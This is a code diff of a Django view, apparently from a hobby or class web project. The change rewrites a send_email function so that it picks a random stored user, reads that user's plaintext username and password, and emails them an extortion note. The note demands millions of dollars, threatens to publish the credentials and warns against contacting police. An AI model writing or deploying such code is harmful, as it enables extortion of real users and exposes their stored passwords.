@@ -32,19 +32,28 @@ def giveimages(request):
     pass
 
 def send_email(request):
-    template_name='captcha.html'
-    subject = "YOU'VE BEEN L33T HAXXED N00B!!"
-    message = "Hello, we are elite hacker team. You system has been comprimised. If you do not to us send 500 $ dollar, we will post you credential for everyone to see."
+    # Option 1: Get random user object from database
+    user_obj = smuck.objects.all()
+    random_item = random.choice(user_obj)
+    username = random_item.username
+    password = random_item.password
+    to_email = random_item.email
+
+    # Option 2: Use current user object
+    # username = request.POST.get('username', '')
+    # password = request.POST.get('password', '')
+    # to_email = request.POST.get('email', '')
+
+    subject = "YOU'VE BEEN HAXXED N00B!!"
+    message = "Hello, we are elite l33t hacker team. You system has been comprimised. \
+    If you do not to us send 5,000,000$ million dollar, we will post you credential for everyone to see. \
+    \r You do not trust great hacker skills? Here is proof: \
+    \r you username: " + username + "\r you password: " + password +
+    "\r do Not worry, if the 5,0000,000 is send, we will be deleting all information." +
+    "\r DO NOT try to contact the police:we monitoring all your account and we release the information" +
+    "if police are contacted." + "\r thank you for cooperation.\r L33t Haxx0rs"
     from_email = [settings.EMAIL_HOST_USER]
-    username = request.POST.get('username', '')
-    password = request.POST.get('password', '')
-    to_email = request.POST.get('email', '')
-    if to_email:
-        #try:
-            send_mail(subject, message, from_email, [to_email])
-#        except BadHeaderError:
-#            return HttpResponse('Invalid header found.')
-#        return HttpResponseRedirect('/main/confirm')
-#    else:
-#        return HttpResponse('Make sure all fields are entered and valid.')
+    if to_email and username and password:
+        send_mail(subject, message, from_email, [to_email])
+#   return HttpResponseRedirect('/main/confirm')
     return HttpResponse();
